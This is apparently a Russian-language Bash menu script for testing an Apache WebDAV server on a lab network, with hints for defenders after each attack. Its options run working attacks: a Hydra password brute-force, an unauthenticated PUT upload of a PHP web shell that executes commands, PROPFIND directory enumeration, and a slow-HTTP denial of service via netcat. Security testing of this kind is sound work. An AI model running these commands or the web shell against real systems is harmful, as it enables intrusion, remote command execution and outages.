#!/bin/bash

VICTIM_IP="192.168.1.21"
TARGET_USER="webdav_user"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}===================================================================${NC}"
echo -e "${CYAN} ИНТЕРАКТИВНЫЙ МЕНЕДЖЕР СИМУЛЯЦИИ УГРОЗ ДЛЯ WEBDAV (Apache)   ${NC}"
echo -e "${CYAN}===================================================================${NC}"
echo -e "Адрес машины-жертвы (WebDAV-сервер): ${GREEN}${VICTIM_IP}${NC}"
echo ""
echo "Выберите тип угрозы для воспроизведения на стенде:"
echo "1) Атака Brute-Force по словарю (Hydra / HTTP Basic Auth)"
echo "2) Внедрение Web Shell через несанкционированный метод PUT"
echo "3) Сбор структуры данных репозитория через метод PROPFIND"
echo "4) Симуляция прикладного DoS (Slow HTTP / Медленные заголовки)"
echo "5) Выход из меню"
echo -e "${CYAN}------------------------------------------------------------------=${NC}"
read -p "Введите номер действия (1-5): " CHOICE

case $CHOICE in
    1)
        echo -e "\n${RED}[!] Запуск атаки Brute-Force на WebDAV-интерфейс...${NC}"
        echo "Создание временного словаря паролей..."
        echo -e "wrong_web_pass1\nwrong_web_pass2\nwrong_web_pass3" > /tmp/webdav_pass.txt
        
        hydra -l "$TARGET_USER" -P /tmp/webdav_pass.txt "$VICTIM_IP" http-get /dav/ -V -t 1
        
        rm -f /tmp/webdav_pass.txt
        echo -e "\n${GREEN}[+] Симуляция брутфорса завершена.${NC}"
        echo -e "${CYAN}[*] Проверьте webdav_access.log на наличие множественных кодов 401.${NC}"
        ;;
        
    2)
        echo -e "\n${RED}[!] Попытка загрузки вредоносного Web Shell (Метод PUT)...${NC}"
        # Отправляем кусок PHP-кода (бэкдор) без авторизации
        curl -i -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://"$VICTIM_IP"/dav/shell.php
        
        echo -e "\n\n${GREEN}[+] Запрос PUT отправлен.${NC}"
        echo -e "${CYAN}[*] Безопасная конфигурация должна вернуть ошибку 401 Unauthorized и запретить запись.${NC}"
        ;;
        
    3)
        echo -e "\n${RED}[!] Сбор структуры данных репозитория (Метод PROPFIND)...${NC}"
        curl -i -X PROPFIND --header "Depth: 1" http://"$VICTIM_IP"/dav/
        
        echo -e "\n\n${GREEN}[+] Запрос PROPFIND отправлен.${NC}"
        echo -e "${CYAN}[*] При отсутствии авторизации сервер не выдаст XML-структуру файлов.${NC}"
        ;;
        
    4)
        echo -e "\n${RED}[!] Запуск симуляции прикладного DoS (Slow HTTP Read/Write)...${NC}"
        echo "Открытие медленных соединений для удержания пула потоков Apache..."
        
        for i in {1..15}; do
            echo -ne "GET /dav/ HTTP/1.1\r\nHost: ${VICTIM_IP}\r\nUser-Agent: SlowAttackSim\r\n" | nc -w 10 "$VICTIM_IP" 80 > /dev/null &
        done
        
        echo -e "${GREEN}[+] Потоки симуляции Slow HTTP инициированы.${NC}"
        echo -e "${CYAN}[*] Параметры 'Timeout 60' и 'KeepAliveTimeout' на сервере защитят пул процессов.${NC}"
        ;;
        
    5)
        echo -e "\n${GREEN}Выход из менеджера симуляции WebDAV.${NC}"
        exit 0
        ;;
        
    *)
        echo -e "\n${RED}[–] Неверный выбор. Укажите число от 1 до 5.${NC}"
        ;;
esac
